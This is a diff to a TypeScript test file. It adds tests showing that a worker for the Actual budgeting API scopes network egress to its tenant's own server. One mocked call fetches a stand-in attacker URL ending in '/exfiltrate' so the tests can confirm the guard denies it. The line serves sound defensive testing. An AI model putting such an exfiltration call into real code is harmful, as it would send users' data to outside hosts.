@@ -84,6 +84,11 @@ async function baseConfig(): Promise<ActualOpenConfig> {
     e2ePassword: null,
     logLevel: 'info',
     baseCurrency: 'EUR',
+    // 'off' everywhere except the egress-scoping tests below (#536), which need
+    // 'enforce' to observe anything — every other test in this file is about the
+    // IPC/dispatch layer, not egress, and would otherwise pay for installing a
+    // guard it never looks at.
+    egressMode: 'off',
   }
 }
 
@@ -399,6 +404,96 @@ describe("'sync'", () => {
     const response = await handleRequest({ id: 3, kind: 'sync' }, () => undefined)
     expect(response).toEqual({ id: 3, ok: true, result: null })
     expect(sync).toHaveBeenCalledTimes(1)
+  })
+})
+
+describe('egress: this worker installs its own guard, scoped to its own tenant (#536)', () => {
+  // Unlike every other test in this file, `@actual-app/api`'s mocks here actually
+  // call `fetch` — the only way to observe that this worker's guard is real rather
+  // than assumed, since the mock is otherwise the only thing standing in for
+  // whatever `@actual-app/api` does on the wire.
+  it("lets 'call' reach the tenant's own host but denies any other host, and revokes both once the call ends", async () => {
+    const realFetch = globalThis.fetch
+    try {
+      const seen: string[] = []
+      globalThis.fetch = (async (input: Request | string | URL) => {
+        // The guard always calls `original` with a `Request` it built itself
+        // (so it can retry a redirect with a fresh body), never the raw input.
+        seen.push(input instanceof Request ? input.url : String(input))
+        return new Response('{}', { status: 200 })
+      }) as unknown as typeof fetch
+
+      const config = await baseConfig()
+      config.egressMode = 'enforce'
+      const { handleRequest } = await freshWorker()
+      await handleRequest({ id: 1, kind: 'open', config }, () => undefined)
+
+      aqlQuery.mockImplementation(async (query) => {
+        await fetch(new URL('/health', config.serverUrl))
+        return { data: [], serialized: query.serialize() }
+      })
+      const allowed = await handleRequest(
+        { id: 2, kind: 'call', method: 'aqlQuery', args: [{ tableName: 'transactions', filterExpressions: [] }] },
+        () => undefined,
+      )
+      expect(allowed).toMatchObject({ id: 2, ok: true })
+      expect(seen).toEqual([`${config.serverUrl}/health`])
+
+      aqlQuery.mockImplementation(async (query) => {
+        await fetch('https://attacker.example.net/exfiltrate')
+        return { data: [], serialized: query.serialize() }
+      })
+      const denied = (await handleRequest(
+        { id: 3, kind: 'call', method: 'aqlQuery', args: [{ tableName: 'transactions', filterExpressions: [] }] },
+        () => undefined,
+      )) as Reply
+      expect(denied.ok).toBe(false)
+      const message = !denied.ok ? denied.error.message : ''
+      expect(message).toContain('egress to attacker.example.net is not allowed')
+
+      // The grant above lived only for the call it was made on behalf of — a
+      // fetch to the same host made outside any call/batch/sync must be refused
+      // exactly like any other unconfigured host would be.
+      await expect(fetch(config.serverUrl)).rejects.toThrow(
+        /egress to actual\.example\.com is not allowed/,
+      )
+    } finally {
+      globalThis.fetch = realFetch
+    }
+  })
+
+  it("grants the tenant's own host for 'batch' and 'sync' too", async () => {
+    const realFetch = globalThis.fetch
+    try {
+      globalThis.fetch = (async () => new Response('{}', { status: 200 })) as unknown as typeof fetch
+
+      const config = await baseConfig()
+      config.egressMode = 'enforce'
+      const { handleRequest } = await freshWorker()
+      await handleRequest({ id: 1, kind: 'open', config }, () => undefined)
+
+      getAccountBalance.mockImplementation(async (id) => {
+        await fetch(new URL(`/accounts/${id}`, config.serverUrl))
+        return 4_200
+      })
+      const batchResponse = await handleRequest(
+        {
+          id: 2,
+          kind: 'batch',
+          ops: [{ method: 'getAccountBalance', args: ['acct-1'] }],
+        },
+        () => undefined,
+      )
+      expect(batchResponse).toMatchObject({ id: 2, ok: true })
+
+      sync.mockImplementation(async () => {
+        await fetch(new URL('/sync', config.serverUrl))
+      })
+      const syncResponse = await handleRequest({ id: 3, kind: 'sync' }, () => undefined)
+      expect(syncResponse).toMatchObject({ id: 3, ok: true })
+    } finally {
+      globalThis.fetch = realFetch
+    }
   })
 })
 
